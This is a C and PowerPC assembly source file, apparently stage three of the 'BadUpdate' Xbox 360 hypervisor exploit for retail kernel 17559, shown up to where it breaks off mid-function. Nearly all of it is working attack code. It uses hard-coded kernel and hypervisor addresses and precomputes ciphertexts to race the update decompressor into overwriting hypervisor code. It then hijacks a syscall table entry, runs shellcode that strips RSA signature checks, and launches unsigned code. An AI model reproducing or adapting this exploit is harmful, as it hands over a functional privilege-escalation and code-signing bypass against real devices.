
// Notes:
//
//  - NO GLOBAL VARIABLES!!! This code is executed from a RX section of memory, any attempt to write to this memory
//      will cause an exception to be thrown and the console to crash. Any data that must be writable must be stored
//      in some runtime allocation that is writable memory.

// Compiler options:
#define KRNL_RETAIL_17559       // Build exploit for retail kernel 17559


typedef struct _STRING {
  USHORT  Length;
  USHORT  MaximumLength;
  PCHAR  Buffer;
} ANSI_STRING;


// Offset into the 14th block of the update file that contains the instructions we want to write at HV_SEG3_OVERWRITE_OFFSET.
// This should point to the following instruction pattern:
//
//      stb     %r4, 2(%r6)
//      blr
#define BLOCK_14_TARGET_OFFSET          0x15E8

#define BLOCK_14_SIZE                   0x1AD0


#if defined(KRNL_RETAIL_17559)

////////////////////////////////////////////////////////////////////////////////////////////////////
// Retail config
////////////////////////////////////////////////////////////////////////////////////////////////////

// Offset into the 3rd segment of the hypervisor we want to overwrite. This should point to the absolute last bit
// of code in the segment that we can overwrite and still hit from a syscall.
#define HV_SEG3_OVERWRITE_OFFSET        0x1F28

// Address into the hypervisor syscall table for the HvxPostOutput entry (syscall 0xD).
#define HV_SYSCALL_POST_OUTPUT_ADDRESS      0x8000010200015FD0 + (0xD * 4)

/*
    Points to the following instruction sequence in _v_DataStorage exception handler:

        mtctr       r4
        bctr

    This gadget MUST be in the first segment of the hypervisor as we can only write a 32-bit
    offset to the syscall entry table.
*/
#define HV_CALL_R4_GADGET_ADDRESS       0x00000354

// Address of MmPhysical64KBMappingTable in the kernel, we update the mapping table to expose the cipher text for
// the hypervisor segments at the virtual address 0xA0000000. This allows for observing when the cipher text changes
// which indicates we won the race condition and a block has overwritten hypervisor code.
#define MmPhysical64KBMappingTable      0x801C1000

////////////////////////////////////////////////////////////////////////////////////////////////////
// Hypervisor syscall ordinals:
#define HVX_KEYS_EXECUTE                        0x42
#define HVX_ENCRYPTED_RESERVE_ALLOCATION        0x49
#define HVX_ENCRYPTED_RELEASE_ALLOCATION        0x4C
#define HVX_ENCRYPTED_ENCRYPT_ALLOCATION        0x4A
#define HVX_REVOKE_UPDATE                       0x65
#define HVX_ARB_WRITE_SYSCALL                   0x21
#define HVX_FLUSH_SINGLE_TB                     0x04

// Drive mapping for exploit files:
#define PAYLOAD_DRIVE           "PAYLOAD:"

////////////////////////////////////////////////////////////////////////////////////////////////////
// Function addresses:
/* 3 */ void (__cdecl *DbgPrint)(const char* format, ...) = (void(__cdecl*)(const char*, ...))0x80085EE8;

// Do NOT define DbgBreakPoint on retail or the console will halt!!!
#define DbgBreakPoint(...)

/* 190 */ ULONG (*MmGetPhysicalAddress)(PVOID pAddress) = (ULONG(*)(PVOID))0x80080048;
/* 97 */ void (*KeFlushCacheRange)(void *pAddress, DWORD Size) = (void(*)(void*, DWORD))0x80073850;

/* 107 */ ULONG (*KeLockL2)(int index, void* address, ULONG size, ULONG mask1, ULONG mask2) = (ULONG(*)(int, void*, ULONG, ULONG, ULONG))0x80071E00;

/* 168 */ void (*KeStallExecutionProcessor)(ULONG Miliseconds) = (void(*)(ULONG))0x80073484;

/* 300 */ VOID (*RtlInitAnsiString)(ANSI_STRING* pAnsiStr, char *String) = (VOID(*)(ANSI_STRING*, char*))0x80086110;
/* 259 */ UINT (*ObCreateSymbolicLink)( ANSI_STRING* SymbolicLinkName, ANSI_STRING* DeviceName ) = (UINT(*)(ANSI_STRING*, ANSI_STRING*))0x8008AEF0;

/* 41 */ void (*HalSendSMCMessage)(BYTE* pMessage, BOOL bResponse) = (void(*)(BYTE*, BOOL))0x80067F48;

/* 434 */ void (*VdDisplayFatalError)(DWORD code) = (void(*)(DWORD))0x800BDD40;

/* 207 */ DWORD (*NtClose)(HANDLE hHandle) = (DWORD(*)(HANDLE))0x80089EB0;

#endif

// Sanity checks for exploit data:
#if (HV_SEG3_OVERWRITE_OFFSET < BLOCK_14_TARGET_OFFSET)
    #error "HV_SEG3_OVERWRITE_OFFSET must be >= BLOCK_14_TARGET_OFFSET!!"
#endif


// Exploit error codes:
#define ERR_OPEN_UPDATE_FILE                0   // Failed to open update_data.bin
#define ERR_UPDATE_FILE_OOM                 1   // Failed to allocate memory for update file
#define ERR_READING_UPDATE_FILE             2   // Failed to read the update file
#define ERR_OPEN_SHELLCODE_FILE             3   // Failed to open BadUpdateExploit-4thStage.bin
#define ERR_SHELLCODE_FILE_OOM              4   // Failed to allocate memory for shell code file
#define ERR_READING_SHELLCODE_FILE          5   // Failed to read shell code file
#define ERR_LOCKL2_OOM                      6   // Failed to allocate memory for LockL2 call
#define ERR_LOCKL2_RESERVE                  7   // Failed to reserve L2 space
#define ERR_LOCKL2_COMMIT                   8   // Failed to commit L2 space
#define ERR_ENCRYPTED_RESERVE               9   // Failed to reserve encrypted memory
#define ERR_ENCRYPTED_COMMIT                10  // Failed to encrypted reserved memory region
#define ERR_CACHE_FLUSH_BUFFER_OOM          11  // Failed to allocate memory for cache flushing buffer
#define ERR_CIPHER_TEXT_BUFFER_OOM          12  // Failed to allocate memory for cipher text buffer
#define ERR_UPDATE_DATA_OOM                 13  // Failed to allocate memory for update data buffer
#define ERR_XKE_OOM_1                       14  // Failed to allocate memory for XKE payload buffer (working)
#define ERR_XKE_OOM_2                       15  // Failed to allocate memory for XKE payload buffer (clean)
#define ERR_READING_XKE_PAYLOAD_FILE        16  // Failed to read xke_update.bin
#define ERR_CREATING_WORKER_THREAD          17  // Failed to create worker thread
#define ERR_EXPLOIT_PAYLOAD_FAILED          18  // Exploit payload failed to run


static ULONGLONG __declspec(naked) HvxKeysExecute(ULONG Address, DWORD Size, ULONGLONG Arg1, ULONGLONG Arg2, ULONGLONG Arg3, ULONGLONG Arg4)
{
    _asm
    {
        li      r0, HVX_KEYS_EXECUTE
        sc
        blr
    }
}

static BOOL __declspec(naked) HvxEncryptedReserveAllocation(ULONG VirtualAddr, ULONG PhysicalAddr, ULONG Size)
{
    _asm
    {
        li      r0, HVX_ENCRYPTED_RESERVE_ALLOCATION
        sc
        blr
    }
}

static BOOL __declspec(naked) HvxEncryptedEncryptAllocation(ULONG VirtualAddr)
{
    _asm
    {
        li      r0, HVX_ENCRYPTED_ENCRYPT_ALLOCATION
        sc
        blr
    }
}

static BOOL __declspec(naked) HvxEncryptedReleaseAllocation(ULONG VirtualAddr)
{
    _asm
    {
        li      r0, HVX_ENCRYPTED_RELEASE_ALLOCATION
        sc
        blr
    }
}

static ULONG __declspec(naked) HvxRevokeUpdate(ULONG BufferAddr, ULONG BufferSize, ULONG Arg3)
{
    _asm
    {
        li      r0, HVX_REVOKE_UPDATE
        sc
        blr
    }
}

static void __declspec(naked) HvxWriteByte(ULONG ordinal, ULONG address, ULONG size, ULONGLONG writeAddr)
{
    _asm
    {
        li      r0, HVX_ARB_WRITE_SYSCALL
        sc
        blr
    }
}

static void __declspec(naked) HvxFlushSingleTb(void *address)
{
    _asm
    {
        li      r0, HVX_FLUSH_SINGLE_TB
        sc
        blr
    }
}

struct UPDATE_BUFFER_INFO
{
    /* 0x00 */ ULONG TotalSize;                     // Total size of the update buffer, must match input param
    /* 0x04 */ ULONG InfoSize;                      // Size of this structure, must be 0x80
    /* 0x08 */ BYTE _pad0[0x18];
    /* 0x20 */ ULONG UpdateDataOffset;              // Offset of the update data blob
    /* 0x24 */ ULONG UpdateDataSize;                // Size of the update data blob
    /* 0x28 */ ULONG OutputBufferOffset;            // Offset of the output data buffer
    /* 0x2C */ ULONG OutputBufferSize;              // Size of the output data buffer (should match decompressed size found in update data header)
    /* 0x30 */ ULONG ScratchBufferOffset;           // Offset of the scratch buffer used for LZX decompression
    /* 0x34 */ ULONG ScratchBufferSize;             // Size of the scratch buffer
    /* 0x38 */ ULONG Buffer2Offset;                 // Offset of last buffer, not sure what the use is (final output buffer?)
    /* 0x3C */ ULONG Buffer2Size;                   // Size of last buffer

    /* 0x60 */ //ULONG
    /* 0x64 */ //ULONG
};

#define CACHE_LINE_SIZE     0x80
#define CACHE_ALIGN(s)      (((s) + 0x7F) & ~0x7F)
#define PAGE_ALIGN_64K(s)   (((s) + 0xFFFF) & ~0xFFFF)

struct THREAD_ARGS
{
    BYTE* pCompressedDataClean;
    DWORD CompressedDataSize;
    BYTE* pCompressedDataInBuffer;
    BYTE* pPayloadClean;
    BYTE* pPayloadBuffer;
    DWORD PayloadPhys;
    DWORD PayloadSize;
    DWORD UpdateDataPhys;
    DWORD UpdateDataSize;
    BYTE* pScratchDataInBuffer;
    DWORD ScratchDataOffset;
    DWORD ScratchDataSize;

    ULONGLONG HvCheckAddress;
    ULONGLONG ShellCodePhysAddress;

    BYTE* pScratchBuffer;
};

// Index bits of the ciphertext lookup pseudo-hashtable
#define HASH_BITS 10

struct CIPHER_TEXT_DATA
{
    ULONGLONG dec_end_input_pos;
    ULONGLONG dec_output_buffer;        // New dec_output_buffer pointer (dst address for memcpy)

    // Cipher texts for the LZX decoder context header, used to detect when to start the race attack
    ULONGLONG canaries[1 << HASH_BITS];
    // Cipher texts containing our malicious dec_output_buffer pointer (points to hypervisor memory)
    // For a given detected header ciphertext, the corresponding replacement is determined by array index.
    ULONGLONG replacements[1 << HASH_BITS];
    ULONGLONG replacements2[1 << HASH_BITS];
};

/*
    Hand rolled implementation for XLockL2.
*/
BOOL WINAPI XLockL2(DWORD dwIndex, CONST PVOID pRangeStart, DWORD dwRangeSize, DWORD dwLockSize, DWORD dwFlags)
{
    ULONG maskValue = (dwLockSize == (256 * 1024) ? 0x3 : 0x1) << (2 * dwIndex);

    ULONG mask1 = (dwFlags & 0x1) != 0 ? 0 : maskValue;
    ULONG mask2 = (dwFlags & 0x2) != 0 ? 0 : maskValue;

    ULONG result = KeLockL2(dwIndex, pRangeStart, dwRangeSize, mask1, mask2);
    return result == 0 ? TRUE : FALSE;
}

bool ReadFile(LPCSTR pFilePath, BYTE* pBuffer, DWORD Offset, DWORD BufferSize)
{
    DWORD BytesRead = 0;

    HANDLE hFile = CreateFile(pFilePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE)
    {
        DbgPrint("Failed to open '%s' %d\n", pFilePath, GetLastError());
        return false;
    }

    DWORD fileSize = GetFileSize(hFile, NULL);
    if (fileSize > BufferSize - Offset)
    {
        DbgPrint("Error reading file, buffer not large enough to hold data!\n");
        NtClose(hFile);
        return false;
    }

    if (ReadFile(hFile, pBuffer + Offset, fileSize, &BytesRead, NULL) == FALSE || BytesRead != fileSize)
    {
        DbgPrint("Error reading file '%s' %d\n", pFilePath, GetLastError());
        NtClose(hFile);
        return false;
    }

    NtClose(hFile);
    return true;
}

bool CreateDriveMapping(char * szMappingName, char * szDeviceName)
{
    ANSI_STRING linkname, devicename;

    RtlInitAnsiString(&linkname, szMappingName);
    RtlInitAnsiString(&devicename, szDeviceName);

    UINT status = ObCreateSymbolicLink(&linkname, &devicename);
    if (status >= 0)
        return true;

    return false;
}

#define LED_COLOR_RED_1         0x01
#define LED_COLOR_RED_2         0x02
#define LED_COLOR_RED_3         0x04
#define LED_COLOR_RED_4         0x08
#define LED_COLOR_GREEN_1       0x10
#define LED_COLOR_GREEN_2       0x20
#define LED_COLOR_GREEN_3       0x40
#define LED_COLOR_GREEN_4       0x80

void SetLEDColor(int color)
{
    BYTE abSmcCmd[16] = { 0 };

    abSmcCmd[0] = 0x99;
    abSmcCmd[1] = 0xFF;
    abSmcCmd[2] = (BYTE)color;

    HalSendSMCMessage(abSmcCmd, FALSE);
}

bool ReadUpdateFile(BYTE** ppCompressedDataClean, DWORD* pdwCompressedDataSize)
{
    DWORD BytesRead = 0;

    // Open the update file for reading.
    HANDLE hFile = CreateFile(PAYLOAD_DRIVE "\\update_data.bin", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE)
    {
        DbgPrint("Failed to open update data file\n");
        DbgBreakPoint();
        VdDisplayFatalError(0x12400 | ERR_OPEN_UPDATE_FILE);
        return false;
    }

    // Get the size of the file.
    DWORD dwFileSize = GetFileSize(hFile, NULL);

    // Allocate memory for the clean update data buffer.
    BYTE* pBuffer = (BYTE*)XPhysicalAlloc(dwFileSize, MAXULONG_PTR, 0, PAGE_READWRITE);
    if (pBuffer == NULL)
    {
        DbgPrint("Failed to allocate memory for update data\n");
        DbgBreakPoint();
        VdDisplayFatalError(0x12400 | ERR_UPDATE_FILE_OOM);
    }

    memset(pBuffer, 0, dwFileSize);

    // Read the file into memory.
    if (ReadFile(hFile, pBuffer, dwFileSize, &BytesRead, NULL) == false || BytesRead != dwFileSize)
    {
        DbgPrint("Failed to read update data file\n");
        DbgBreakPoint();
        VdDisplayFatalError(0x12400 | ERR_READING_UPDATE_FILE);
        return false;
    }

    // Update the pointers for the update data.
    *ppCompressedDataClean = pBuffer;
    *pdwCompressedDataSize = dwFileSize;

    NtClose(hFile);
    return true;
}

bool ReadShellCodeFile(BYTE** ppShellCodeBuffer, DWORD* pdwShellCodeBufferSize)
{
    DWORD BytesRead = 0;

    // Open the update file for reading.
    HANDLE hFile = CreateFile(PAYLOAD_DRIVE "\\BadUpdateExploit-4thStage.bin", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE)
    {
        DbgPrint("Failed to open shell code file\n");
        DbgBreakPoint();
        VdDisplayFatalError(0x12400 | ERR_OPEN_SHELLCODE_FILE);
        return false;
    }

    // Get the size of the file.
    DWORD dwFileSize = GetFileSize(hFile, NULL);
    DWORD dwBufferSize = (dwFileSize + 0x7F) & ~0x7F;

    // Allocate memory for the clean update data buffer.
    BYTE* pBuffer = (BYTE*)XPhysicalAlloc(dwBufferSize, MAXULONG_PTR, 0x10000, PAGE_READWRITE | PAGE_NOCACHE | MEM_LARGE_PAGES);
    if (pBuffer == NULL)
    {
        DbgPrint("Failed to allocate memory for shell code data\n");
        DbgBreakPoint();
        VdDisplayFatalError(0x12400 | ERR_SHELLCODE_FILE_OOM);
    }

    memset(pBuffer, 0, dwBufferSize);

    // Read the file into memory.
    if (ReadFile(hFile, pBuffer, dwFileSize, &BytesRead, NULL) == false || BytesRead != dwFileSize)
    {
        DbgPrint("Failed to read shell code file\n");
        DbgBreakPoint();
        VdDisplayFatalError(0x12400 | ERR_READING_SHELLCODE_FILE);
        return false;
    }

    // Update the pointers for the update data.
    *ppShellCodeBuffer = pBuffer;
    *pdwShellCodeBufferSize = dwBufferSize;

    NtClose(hFile);
    return true;
}

/*
    Helper function to lock a portion of the L2 cache. This puts pressure on CPU L2 cache and causes data
    to age out more quickly.
*/
void LockAndThrashL2(int index)
{
    // Allocate a block of 256kb cachable physical memory that will be used to lock the L2 range.
    BYTE* pPhysMemoryPtr = (BYTE*)XPhysicalAlloc(256 * 1024, MAXULONG_PTR, 256 * 1024, PAGE_READWRITE | MEM_LARGE_PAGES);
    if (pPhysMemoryPtr == NULL)
    {
        DbgPrint("Failed to allocate memory for L2 cache lock\n");
        DbgBreakPoint();
        VdDisplayFatalError(0x12400 | ERR_LOCKL2_OOM);
    }

    // Reserve L2 cache and lock 2 of the available pathways.
    if (XLockL2(index, pPhysMemoryPtr, 256 * 1024, 0x40000, 0) == FALSE)
    {
        DbgPrint("Failed to reserve L2 cache range\n");
        DbgBreakPoint();
        VdDisplayFatalError(0x12400 | ERR_LOCKL2_RESERVE);
    }

    // Fill the cache with trash data.
    memset(pPhysMemoryPtr, 0x41, 256 * 1024);

    // Commit the L2 cache range and prevent it from being replaced.
    if (XLockL2(index, pPhysMemoryPtr, 256 * 1024, 0x40000, 0x1) == FALSE)
    {
        DbgPrint("Failed to commmit L2 cache range\n");
        DbgBreakPoint();
        VdDisplayFatalError(0x12400 | ERR_LOCKL2_COMMIT);
    }
}

/*
    Generates the cipher text needed for the race attack.
*/
void BuildCipherTextLookupTable(BYTE* pUpdateData, DWORD UpdateDataSize, DWORD ScratchOffset, CIPHER_TEXT_DATA* pCipherTextData)
{
    BYTE *pMemoryAddress = (BYTE*)0x8D000000;

    // Scan all 1024 possible whitening bits.
    for (int i = 0; i < 1024; i++)
    {
        // Allocate encrypted memory.
        DWORD result = HvxEncryptedReserveAllocation((DWORD)pMemoryAddress, MmGetPhysicalAddress(pUpdateData + ScratchOffset), 0x10000);
        if (result == FALSE)
        {
            DbgPrint("Failed to reserve encrypted memory 0x%08x\n", result);
            DbgBreakPoint();
            VdDisplayFatalError(0x12400 | ERR_ENCRYPTED_RESERVE);
            return;
        }

        result = HvxEncryptedEncryptAllocation((DWORD)pMemoryAddress);
        if (result == FALSE)
        {
            DbgPrint("Failed to commit encrypted memory 0x%08x\n", result);
            DbgBreakPoint();
            VdDisplayFatalError(0x12400 | ERR_ENCRYPTED_COMMIT);
            return;
        }
        // Need to manually flush the one _TLB entry_ corresponding to the encrypted allocation above.
        // The HV just modifies the page table but does not invalidate the TLB entry in either
        // "HvxEncryptedEncryptAllocation" or "HvxEncryptedReleaseAllocation".
        // This means we might see the mapping (and whitening value) from the previous iteration if that did
        // not age out from the TLB.
        HvxFlushSingleTb(pMemoryAddress);

        // Get a cipher text for the expected header data in the LZX decoder context. This acts as a
        // "oracle"/canary to know when to start the race attack.
        memset(pMemoryAddress, 0, 16);
        *(ULONG*)(pMemoryAddress + 0) = 0x4349444c;     // signature = 'CIDL'
        *(ULONG*)(pMemoryAddress + 4) = 0x8000;         // windows size = 0x8000
        *(ULONG*)(pMemoryAddress + 8) = 1;              // cpu type = 1
        __dcbst(0, (char *) pMemoryAddress);

        KeFlushCacheRange(pMemoryAddress, 0x80);
        KeFlushCacheRange(pUpdateData + ScratchOffset, 0x80);

        ULONGLONG tmp = *(ULONGLONG *) (pUpdateData + ScratchOffset);
        int idx = tmp >> (64 - HASH_BITS);
        pCipherTextData->canaries[idx] = tmp;

        // Get the corresponding cipher text, with the same whitening value as above,
        // for our malicious dec_output_buffer pointer which points to the hypervisor code we want to overwrite.
        *(ULONGLONG*)(pMemoryAddress + 0x2B20) = pCipherTextData->dec_end_input_pos;
        *(ULONGLONG*)(pMemoryAddress + 0x2B28) = pCipherTextData->dec_output_buffer;
        __dcbst(0, (char *) pMemoryAddress + 0x2B00);

        KeFlushCacheRange(pMemoryAddress + 0x2B00, 0x80);
        KeFlushCacheRange(pUpdateData + ScratchOffset + 0x2B00, 0x80);

        pCipherTextData->replacements[idx] = *(ULONGLONG *) (pUpdateData + ScratchOffset + 0x2B20);
        pCipherTextData->replacements2[idx] = *(ULONGLONG *) (pUpdateData + ScratchOffset + 0x2B28);


        // Free the encrypted allocation.
        result = HvxEncryptedReleaseAllocation((DWORD)pMemoryAddress);
    }
}

ULONG __declspec(naked) HvxPostOutputExploit(ULONG r3, ULONGLONG shellCodeAddress)
{
    _asm
    {
        li      r0, 0xD
        sc
        blr
    }
}

/*
    Helper function that utilizes the single by write primitive to write a 32-bit integer at the chosen 64-bit real address.
*/
void HvWriteULONG(ULONGLONG address, ULONG value)
{
    /*
        stb       r4, 2(r6)
        blr
    */
    HvxWriteByte(4, 0x60000 | (ULONG)((value >> 24) & 0xFF), 0x1000, address - 2);
    HvxWriteByte(4, 0x60000 | (ULONG)((value >> 16) & 0xFF), 0x1000, address - 2 + 1);
    HvxWriteByte(4, 0x60000 | (ULONG)((value >> 8) & 0xFF), 0x1000, address - 2 + 2);
    HvxWriteByte(4, 0x60000 | (ULONG)(value & 0xFF), 0x1000, address - 2 + 3);
}

/*
    Worker thread that continuously runs the XKE update payload, watches for cipher text changes in the hypervisor, and
    runs the fourth stage payload once the race has been won with block 14.
*/
DWORD RunUpdatePayloadThreadProc(THREAD_ARGS* pArgs)
{
    DWORD LedColor = LED_COLOR_RED_1 | LED_COLOR_RED_4 | LED_COLOR_GREEN_1 | LED_COLOR_GREEN_4;

    // Allocate a scratch buffer to help with flushing L2 cache in hypervisor context.
    BYTE* pCacheFlushBuffer = (BYTE*)XPhysicalAlloc(0x20000, MAXULONG_PTR, 0x10000, PAGE_READWRITE | MEM_LARGE_PAGES);
    if (pCacheFlushBuffer == NULL)
    {
        DbgPrint("Failed to allocate memory for cache flush buffer\n");
        DbgBreakPoint();
        VdDisplayFatalError(0x12400 | ERR_CACHE_FLUSH_BUFFER_OOM);
    }

    ULONG CacheFlushBufferPhys = MmGetPhysicalAddress(pCacheFlushBuffer);

    // Lock half of the available L2 cache and pathways to put pressure on the CPU. This causes data in L2 cache to
    // age out more quickly and improves cipher text detection rate.
    LockAndThrashL2(0);
    LockAndThrashL2(1);

    // Poke MmPhysical64KBMappingTable so the hypervisor pages get mapped into memory. This allows us to observe the cipher
    // text for the hypervisor segments and know when we get the block overwrite we want.
    DWORD oldAccessMask = *(DWORD*)MmPhysical64KBMappingTable;
    *(DWORD*)MmPhysical64KBMappingTable = 0x66666666;

    // Get the cipher text at the location we want to overwrite and at an offset that is > the size of block 14. This allows
    // us to determine when we win the race on block 14 (smallest block in the file) vs any other block.
    DWORD* pCipherTextPtr1 = (DWORD*)(0xA0030000 + HV_SEG3_OVERWRITE_OFFSET);
    DWORD* pCipherTextPtr2 = (DWORD*)(0xA0030000 + (HV_SEG3_OVERWRITE_OFFSET - BLOCK_14_TARGET_OFFSET) + BLOCK_14_SIZE + 0x80);
    DWORD cipherValue1 = *pCipherTextPtr1;
    DWORD cipherValue2 = *pCipherTextPtr2;

    // Loop and hammer the payload until we hopefully get code exec.
    while (true)
    {
        // Copy the clean payload data.
        memcpy(pArgs->pPayloadBuffer, pArgs->pPayloadClean, pArgs->PayloadSize);

        // Copy the clean update data into the full buffer.
        memcpy(pArgs->pCompressedDataInBuffer, pArgs->pCompressedDataClean, pArgs->CompressedDataSize);

        // Execute the payload.
        // Status is 0xc8000012 on miss, and 0xc8000006 on hit.
        DWORD result = HvxKeysExecute(pArgs->PayloadPhys, pArgs->PayloadSize, pArgs->UpdateDataPhys, pArgs->UpdateDataSize, NULL, NULL);
        if (result != 0xc8000012) {
            DbgPrint("XKE payload returned status %#x\n", result);
        }

        // Flush cache on the cipher text pointers.
        __dcbf(0, pCipherTextPtr1);

        // Check if we got a block overwrite and if it appears to be block 14.
        DWORD test1 = *pCipherTextPtr1;
        if (cipherValue1 != test1)
        {
            // Flush cache on the secondary cipher text pointer. This one MUST be thorough or else we risk fetching stale data
            // and trying to execute the post-block-write part of the exploit which will cause the console to hang.
            HvxRevokeUpdate(CacheFlushBufferPhys, 0x20000, 0);
            __dcbf(0, pCipherTextPtr2);

            // Note: on debug builds I've seen this check pass when the cipher text had actually changed (i.e.: stale cache) and
            // hang the console. I tried to improve it further but had no success in doing so. I have yet to see this fail on retail
            // consoles so until it happens this should be fine for now...

            // We got a block overwrite, check if it was block 14.
            DWORD test2 = *pCipherTextPtr2;
            if (cipherValue2 == test2)
            {
                // Set the LED color so we know we got the block hit.
                SetLEDColor(LED_COLOR_GREEN_1 | LED_COLOR_GREEN_2 | LED_COLOR_GREEN_3);

                DbgPrint("Block 14 overwrite hit!\n");

                // Overwrite the syscall function pointer for HvxPostOutput to point to a gadget that will jump to an arbitrary address.
                DbgPrint(" * Patching hv syscall table\n");
                HvWriteULONG(HV_SYSCALL_POST_OUTPUT_ADDRESS, HV_CALL_R4_GADGET_ADDRESS);

                // Try to execute our shell code which will restore the data we trashed in the last hypervisor segment and patch out
                // the RSA signature checks on executable files.
                DbgPrint(" * Running payload\n");
                result = HvxPostOutputExploit(0, pArgs->ShellCodePhysAddress);
                if (result != 0x41414141)
                {
                    // Exploit payload failed to run.
                    DbgBreakPoint();
                    VdDisplayFatalError(0x12400 | ERR_EXPLOIT_PAYLOAD_FAILED);
                }

                DbgPrint(" * Payload returned 0x%08x\n", result);
                //DbgBreakPoint();

                // Restore the old access mask for MmPhysical64KBMappingTable.
                *(DWORD*)MmPhysical64KBMappingTable = oldAccessMask;

                // Set the LED color so we know the exploit completed.
                SetLEDColor(LED_COLOR_GREEN_1 | LED_COLOR_GREEN_2 | LED_COLOR_GREEN_3 | LED_COLOR_GREEN_4);

                // Run our unsigned xex file.
                XLaunchNewImage(PAYLOAD_DRIVE "\\default.xex", 0);
            }
            else
            {
                DbgPrint("Race hit: 0x%08x\n", test1);
            }

            // Save the latest block hit values.
            cipherValue1 = test1;
            cipherValue2 = test2;

            // Update LED color to indicate we got a block hit.
            SetLEDColor(LedColor);
            LedColor = ~LedColor & 0xFF;
        }
        else
        {
            DbgPrint("."); // Race miss
        }
    }
}

static void CiphertextOverwriteLoop(void *pScratchPtr, CIPHER_TEXT_DATA *pCipherTextData)
{
    void *addr;
    ULONGLONG *canaries, *replacements, *replacements2, tmp;

    addr = pScratchPtr;
    canaries = pCipherTextData->canaries;
    replacements = pCipherTextData->replacements;
    replacements2 = pCipherTextData->replacements2;

    __dcbf(0, addr);

    for (;;) {
        tmp = *(ULONGLONG *) addr;
        if (tmp != 0 && canaries[tmp >> (64 - HASH_BITS)] == tmp) {
            for (int i = 0; i < 100000; i++) {
                *(ULONGLONG *) ((char *) addr + 0x2B20) = replacements[tmp >> (64 - HASH_BITS)];
                *(ULONGLONG *) ((char *) addr + 0x2B28) = replacements2[tmp >> (64 - HASH_BITS)];
                __dcbst(0x2B20, addr);
            }
        }
        __dcbf(0, addr);
    }
}

void __cdecl main()
{
    ULONG UpdateDataSize = 0x40000 + 0x80000 + 0x10000;
    ULONG PayloadDataSize = 0x6000;

    BYTE* pCleanUpdateData = NULL;
    DWORD CleanUpdateDataSize = 0;

    BYTE* pShellCodeData = NULL;
    DWORD ShellCodeDataSize = 0;

    THREAD_ARGS ThreadArgs = { 0 };

    // Set the LED color so we know the 3rd stage payload started.
    SetLEDColor(LED_COLOR_RED_1 | LED_COLOR_RED_2 | LED_COLOR_RED_3 | LED_COLOR_GREEN_1 | LED_COLOR_GREEN_2 | LED_COLOR_GREEN_3);

    // Read the update file.
    if (ReadUpdateFile(&pCleanUpdateData, &CleanUpdateDataSize) == false)
    {
        return;
    }

    // Read the exploit shell code.
    if (ReadShellCodeFile(&pShellCodeData, &ShellCodeDataSize) == false)
    {
        return;
    }

    // Get the full physical address of the shell code buffer.
    ULONGLONG ShellCodePhys = 0x8000000000000000 | MmGetPhysicalAddress(pShellCodeData);

    // Allocate a 64k block of memory for the update data.
    BYTE* pUpdateData = (BYTE*)XPhysicalAlloc(UpdateDataSize, MAXULONG_PTR, 0x10000, PAGE_READWRITE | PAGE_NOCACHE | MEM_LARGE_PAGES);
    if (pUpdateData == NULL)
    {
        DbgPrint("Failed to allocate memory for update data\n");
        DbgBreakPoint();
        VdDisplayFatalError(0x12400 | ERR_UPDATE_DATA_OOM);
        return;
    }

    // Initialize update data.
    memset(pUpdateData, 0, UpdateDataSize);

    // Allocate some physical memory to store the cipher text we want to write
    CIPHER_TEXT_DATA* pCipherTextBuffer = (CIPHER_TEXT_DATA*)XPhysicalAlloc(sizeof (CIPHER_TEXT_DATA), MAXULONG_PTR, 0x10000, PAGE_READWRITE | MEM_LARGE_PAGES);
    if (pCipherTextBuffer == NULL)
    {
        DbgPrint("Failed to allocate memory for cipher text\n");
        DbgBreakPoint();
        VdDisplayFatalError(0x12400 | ERR_CIPHER_TEXT_BUFFER_OOM);
        return;
    }
    // Zero the above memory so that unused slots of the lookup table contain zeros.
    memset(pCipherTextBuffer, 0, sizeof (CIPHER_TEXT_DATA));

    // Setup cipher text parameters.
    pCipherTextBuffer->dec_end_input_pos = 0xFFFFFFFFFFFFFFFF;
    pCipherTextBuffer->dec_output_buffer = 0x8000010600030000 + (HV_SEG3_OVERWRITE_OFFSET - BLOCK_14_TARGET_OFFSET);

    // Get the size of the decompressed update data.
    DWORD updateDataDecompressedSize = *(DWORD*)(pCleanUpdateData + 0x1C);

    DWORD outputOffset = PAGE_ALIGN_64K(CACHE_LINE_SIZE + CACHE_ALIGN(CleanUpdateDataSize));
    DWORD scratchOffset = PAGE_ALIGN_64K(outputOffset + CACHE_ALIGN(updateDataDecompressedSize));
    BuildCipherTextLookupTable(pUpdateData, UpdateDataSize, scratchOffset, pCipherTextBuffer);

    // Initialize update data.
    memset(pUpdateData, 0, UpdateDataSize);

    UPDATE_BUFFER_INFO* pUpdateInfo = (UPDATE_BUFFER_INFO*)pUpdateData;
    pUpdateInfo->TotalSize = UpdateDataSize;
    pUpdateInfo->InfoSize = CACHE_LINE_SIZE;
    pUpdateInfo->UpdateDataOffset = CACHE_LINE_SIZE;
    pUpdateInfo->UpdateDataSize = CACHE_ALIGN(CleanUpdateDataSize);
    pUpdateInfo->OutputBufferOffset = PAGE_ALIGN_64K(pUpdateInfo->UpdateDataOffset + pUpdateInfo->UpdateDataSize);
    pUpdateInfo->OutputBufferSize = CACHE_ALIGN(updateDataDecompressedSize);
    pUpdateInfo->ScratchBufferOffset = PAGE_ALIGN_64K(pUpdateInfo->OutputBufferOffset + pUpdateInfo->OutputBufferSize);
    pUpdateInfo->ScratchBufferSize = 0x20000;
    pUpdateInfo->Buffer2Offset = CACHE_ALIGN(pUpdateInfo->ScratchBufferOffset + pUpdateInfo->ScratchBufferSize);
    pUpdateInfo->Buffer2Size = 0x10000;

    // Allocate memory for the XKE payload.
    BYTE* pPayload = (BYTE*)XPhysicalAlloc(PayloadDataSize, MAXULONG_PTR, 0x10000, PAGE_READWRITE | PAGE_NOCACHE);
    if (pPayload == NULL)
    {
        DbgPrint("Failed to allocate payload memory\n");
        DbgBreakPoint();
        VdDisplayFatalError(0x12400 | ERR_XKE_OOM_1);
        return;
    }

    BYTE* pPayloadClean = (BYTE*)XPhysicalAlloc(PayloadDataSize, MAXULONG_PTR, 0, PAGE_READWRITE);
    if (pPayloadClean == NULL)
    {
        DbgPrint("Failed to allocate clean payload memory\n");
